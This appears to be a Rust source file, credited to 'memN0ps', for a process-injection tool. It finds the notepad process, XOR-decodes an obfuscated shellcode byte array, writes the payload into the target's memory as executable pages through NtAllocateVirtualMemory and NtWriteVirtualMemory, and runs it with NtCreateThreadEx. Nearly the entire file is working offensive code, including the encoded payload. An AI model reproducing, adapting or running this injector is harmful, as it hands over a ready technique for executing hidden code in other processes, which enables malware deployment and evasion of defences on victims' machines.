//author memN0ps

use ntapi::ntpsapi::{NtOpenProcess, NtCreateThreadEx};
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory};
use sysinfo::{Pid, ProcessExt, System, SystemExt};
use std::default::Default;
use std::ffi::c_void;
use std::ptr::null_mut;
use ntapi::winapi::shared::ntdef::{OBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES, PHANDLE, HANDLE, POBJECT_ATTRIBUTES32, NTSTATUS, LARGE_INTEGER};
use ntapi::ntapi_base::{CLIENT_ID, PCLIENT_ID};
use ntapi::winapi::shared::ntstatus::STATUS_SUCCESS;
use ntapi::winapi::um::lmaccess::ACCESS_ALL;
use winapi::shared::ntstatus;
use winapi::um::winnt::{ACCESS_MASK, MEM_COMMIT, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MAXIMUM_ALLOWED};
use std::mem;
use ntapi::winapi::shared::basetsd::PSIZE_T;

fn main() {
    println!(" ### memN0per ###");

    //Gets the process by name and ID. Returns process_id and process_name
    let process_id = get_process_by_name("notepad");

    println!("[+] Got PID: {}", process_id);

    //inject shellcode into the process
    unsafe
    {
        inject_shellcode(process_id);
    }
}

unsafe fn inject_shellcode(process_id: Pid) {
    println!("[+] Injecting shellcode");

    let mut oa = OBJECT_ATTRIBUTES::default();

    let mut process_handle = process_id as HANDLE;

    let mut ci = CLIENT_ID {
        UniqueProcess: process_handle,
        UniqueThread: null_mut(),
    };


    let mut status = NtOpenProcess(&mut process_handle, ACCESS_ALL, &mut oa, &mut ci);

    if (status != STATUS_SUCCESS) {
        println!("Error opening process: {}", status);
    }
    println!("{}",status);

    let mut buf : Vec<u8> = vec![0x42, 0xf6, 0x3d, 0x5a, 0x4e, 0x56, 0x72, 0xbe, 0xbe, 0xbe, 0xff, 0xef, 0xff, 0xee, 0xec, 0xef, 0xf6, 0x8f, 0x6c, 0xdb, 0xf6, 0x35, 0xec, 0xde, 0xe8, 0xf6, 0x35, 0xec, 0xa6, 0xf6, 0x35, 0xec, 0x9e, 0xf6, 0x35, 0xcc, 0xee, 0xf6, 0xb1, 0x09, 0xf4, 0xf4, 0xf3, 0x8f, 0x77, 0xf6, 0x8f, 0x7e, 0x12, 0x82, 0xdf, 0xc2, 0xbc, 0x92, 0x9e, 0xff, 0x7f, 0x77, 0xb3, 0xff, 0xbf, 0x7f, 0x5c, 0x53, 0xec, 0xf6, 0x35, 0xec, 0x9e, 0xff, 0xef, 0x35, 0xfc, 0x82, 0xf6, 0xbf, 0x6e, 0xd8, 0x3f, 0xc6, 0xa6, 0xb5, 0xbc, 0xb1, 0x3b, 0xcc, 0xbe, 0xbe, 0xbe, 0x35, 0x3e, 0x36, 0xbe, 0xbe, 0xbe, 0xf6, 0x3b, 0x7e, 0xca, 0xd9, 0xf6, 0xbf, 0x6e, 0xee, 0xfa, 0x35, 0xfe, 0x9e, 0xf7, 0xbf, 0x6e, 0x35, 0xf6, 0xa6, 0x5d, 0xe8, 0xf3, 0x8f, 0x77, 0xf6, 0x41, 0x77, 0xff, 0x35, 0x8a, 0x36, 0xf6, 0xbf, 0x68, 0xf6, 0x8f, 0x7e, 0x12, 0xff, 0x7f, 0x77, 0xb3, 0xff, 0xbf, 0x7f, 0x86, 0x5e, 0xcb, 0x4f, 0xf2, 0xbd, 0xf2, 0x9a, 0xb6, 0xfb, 0x87, 0x6f, 0xcb, 0x66, 0xe6, 0xfa, 0x35, 0xfe, 0x9a, 0xf7, 0xbf, 0x6e, 0xd8, 0xff, 0x35, 0xb2, 0xf6, 0xfa, 0x35, 0xfe, 0xa2, 0xf7, 0xbf, 0x6e, 0xff, 0x35, 0xba, 0x36, 0xff, 0xe6, 0xf6, 0xbf, 0x6e, 0xff, 0xe6, 0xe0, 0xe7, 0xe4, 0xff, 0xe6, 0xff, 0xe7, 0xff, 0xe4, 0xf6, 0x3d, 0x52, 0x9e, 0xff, 0xec, 0x41, 0x5e, 0xe6, 0xff, 0xe7, 0xe4, 0xf6, 0x35, 0xac, 0x57, 0xf5, 0x41, 0x41, 0x41, 0xe3, 0xf7, 0x00, 0xc9, 0xcd, 0x8c, 0xe1, 0x8d, 0x8c, 0xbe, 0xbe, 0xff, 0xe8, 0xf7, 0x37, 0x58, 0xf6, 0x3f, 0x52, 0x1e, 0xbf, 0xbe, 0xbe, 0xf7, 0x37, 0x5b, 0xf7, 0x02, 0xbc, 0xbe, 0xbf, 0x05, 0x7e, 0x16, 0x15, 0x3f, 0xff, 0xea, 0xf7, 0x37, 0x5a, 0xf2, 0x37, 0x4f, 0xff, 0x04, 0xf2, 0xc9, 0x98, 0xb9, 0x41, 0x6b, 0xf2, 0x37, 0x54, 0xd6, 0xbf, 0xbf, 0xbe, 0xbe, 0xe7, 0xff, 0x04, 0x97, 0x3e, 0xd5, 0xbe, 0x41, 0x6b, 0xd4, 0xb4, 0xff, 0xe0, 0xee, 0xee, 0xf3, 0x8f, 0x77, 0xf3, 0x8f, 0x7e, 0xf6, 0x41, 0x7e, 0xf6, 0x37, 0x7c, 0xf6, 0x41, 0x7e, 0xf6, 0x37, 0x7f, 0xff, 0x04, 0x54, 0xb1, 0x61, 0x5e, 0x41, 0x6b, 0xf6, 0x37, 0x79, 0xd4, 0xae, 0xff, 0xe6, 0xf2, 0x37, 0x5c, 0xf6, 0x37, 0x47, 0xff, 0x04, 0x27, 0x1b, 0xca, 0xdf, 0x41, 0x6b, 0x3b, 0x7e, 0xca, 0xb4, 0xf7, 0x41, 0x70, 0xcb, 0x5b, 0x56, 0x2d, 0xbe, 0xbe, 0xbe, 0xf6, 0x3d, 0x52, 0xae, 0xf6, 0x37, 0x5c, 0xf3, 0x8f, 0x77, 0xd4, 0xba, 0xff, 0xe6, 0xf6, 0x37, 0x47, 0xff, 0x04, 0xbc, 0x67, 0x76, 0xe1, 0x41, 0x6b, 0x3d, 0x46, 0xbe, 0xc0, 0xeb, 0xf6, 0x3d, 0x7a, 0x9e, 0xe0, 0x37, 0x48, 0xd4, 0xfe, 0xff, 0xe7, 0xd6, 0xbe, 0xae, 0xbe, 0xbe, 0xff, 0xe6, 0xf6, 0x37, 0x4c, 0xf6, 0x8f, 0x77, 0xff, 0x04, 0xe6, 0x1a, 0xed, 0x5b, 0x41, 0x6b, 0xf6, 0x37, 0x7d, 0xf7, 0x37, 0x79, 0xf3, 0x8f, 0x77, 0xf7, 0x37, 0x4e, 0xf6, 0x37, 0x64, 0xf6, 0x37, 0x47, 0xff, 0x04, 0xbc, 0x67, 0x76, 0xe1, 0x41, 0x6b, 0x3d, 0x46, 0xbe, 0xc3, 0x96, 0xe6, 0xff, 0xe9, 0xe7, 0xd6, 0xbe, 0xfe, 0xbe, 0xbe, 0xff, 0xe6, 0xd4, 0xbe, 0xe4, 0xff, 0x04, 0xb5, 0x91, 0xb1, 0x8e, 0x41, 0x6b, 0xe9, 0xe7, 0xff, 0x04, 0xcb, 0xd0, 0xf3, 0xdf, 0x41, 0x6b, 0xf7, 0x41, 0x70, 0x57, 0x82, 0x41, 0x41, 0x41, 0xf6, 0xbf, 0x7d, 0xf6, 0x97, 0x78, 0xf6, 0x3b, 0x48, 0xcb, 0x0a, 0xff, 0x41, 0x59, 0xe6, 0xd4, 0xbe, 0xe7, 0xf7, 0x79, 0x7c, 0x4e, 0x0b, 0x1c, 0xe8, 0x41, 0x6b];

    let mut shellcode : Vec<u8> = Vec::with_capacity(buf.len());
    for x in &buf {
        shellcode.push(*x ^ 0xBE);
    }

    println!("{:?}",shellcode);

    let mut shellcode_length = shellcode.len();

    println!("{}", shellcode_length);

    let handle = process_handle as *mut c_void;
    let mut base_address : *mut c_void = null_mut();
    status = NtAllocateVirtualMemory(handle, &mut base_address, 0, &mut shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


    if (status != STATUS_SUCCESS) {
        println!("Error allocating  memory to the target process: {}", status);
    }
    println!("{}",status);

    let mut bytes_written = 0;

    //Here
    let buffer = shellcode.as_mut_ptr() as *mut c_void;
    let buffer_length = shellcode.len();

    status = NtWriteVirtualMemory(handle, base_address, buffer, buffer_length, &mut bytes_written);

    println!("{}", bytes_written);

    if (status != STATUS_SUCCESS) {
        println!("Error writing shellcode to memory of the target process: {}", status);
    }
    println!("{}",status);

    let mut thread_handle : *mut c_void = null_mut();

    status = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, base_address, null_mut(), 0, 0, 0, 0, null_mut());

    if (status != STATUS_SUCCESS) {
        println!("Error failed to create remote thread: {}", status);
    }
    println!("{}",status);
}

fn get_process_by_name(target_process: &str) -> (Pid) {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id = 0;

    for process in system.process_by_name(target_process) {
        //println!("{} {}", process.pid(), process.name());
        process_id = process.pid();
    }

    return process_id;
}